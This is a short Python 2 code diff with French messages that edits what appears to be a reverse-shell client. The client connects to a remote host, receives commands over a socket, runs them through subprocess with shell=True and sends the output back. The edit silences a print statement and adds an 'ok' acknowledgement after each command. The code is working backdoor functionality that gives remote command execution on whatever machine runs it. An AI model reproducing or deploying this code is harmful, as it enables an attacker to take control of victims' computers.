@@ -9,13 +9,15 @@ def recevCommand():
     while True:
         commande =  sock.recv(4096)
         if 'quitter' in commande:
-            print 'Fermeture de la connexion'
+            # print 'Fermeture de la connexion'
             sock.close()
             break
         else:
             shell =  subprocess.Popen(commande, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            sock.send(shell.stdout.read() + shell.stderr.read())
-
+            try:
+                sock.send(shell.stdout.read() + shell.stderr.read())
+            finally:
+                sock.send("ok")
 def Connect():
     try:
         sock.connect((host, port))
@@ -25,7 +27,6 @@ def Connect():
     finally:
         print 'pas de co'
         # sock.close()
-
 
 def Main ():
     while True:
